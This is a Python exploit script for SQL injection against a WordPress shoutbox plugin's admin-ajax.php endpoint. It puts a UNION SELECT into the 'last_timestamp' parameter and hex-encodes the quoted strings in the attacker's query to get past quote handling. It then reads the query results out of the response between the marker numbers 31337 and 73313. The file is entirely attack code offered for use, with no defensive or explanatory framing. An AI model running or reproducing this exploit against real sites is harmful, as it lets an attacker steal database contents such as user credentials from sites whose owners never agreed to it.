#!/usr/bin/env python

# Import necessary libraries
import argparse
import re
import requests
import sys

# Define functions
def string_to_hex(input_string):
    # Function to HEX the string
    hex_list = []
    for char in input_string:
        hex_list.append(format(ord(char), 'x'))
    return ''.join(hex_list)

def string_to_concat(input_string):
    # Function to CONCAT the obtained HEX
    return "CONCAT(0x" + string_to_hex(input_string) + ")"

def substitute_quotes(s):
    # Substitute the contents of quotes with the result of the string_to_concat function
    return re.sub(r'[\'"]([^\'"]*)[\'"]', lambda m: '{}'.format(string_to_concat(m.group(1))), s)

def extract_content(input_string, start, end):
    # Extract the content of a string using start and end strings
    start_index = input_string.find(start) + len(end)
    end_index = input_string.find(end)
    return input_string[start_index:end_index]

# Main function
def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Exploit')
    parser.add_argument('url', help='URL')
    parser.add_argument('query', help='Query')
    args = parser.parse_args()

    # Perform logic 
    url = args.url + '/wp-admin/admin-ajax.php'
    payload =  substitute_quotes(args.query)
    post_data = {'action': 'shoutbox-ajax-update-messages', 'last_timestamp': '0) UNION ALL SELECT NULL,(SELECT 31337),('+payload+'),(SELECT 73313),NULL,NULL,NULL,NULL-- ', 'rooms[]': 'default'}

    # Print the output
    print('URL:', url)
    print('Original Query:', args.query)
    print('Escaped Query:', payload)

    response = requests.post(url, data=post_data)

    if response.status_code == 200:
        data = response.json()
        if data["success"] == 0:
            print("Request failed, maybe wrong query?")
        else:
            content = response.content.decode('utf-8')
            print("Request done, obtained content:\n" + extract_content(content, '31337','73313').replace('","room":"','').replace('","timestamp":"',''))
    else:
        print("Request failed with status code: ", response.status_code)

# Entry point
if __name__ == '__main__':
    sys.exit(main())
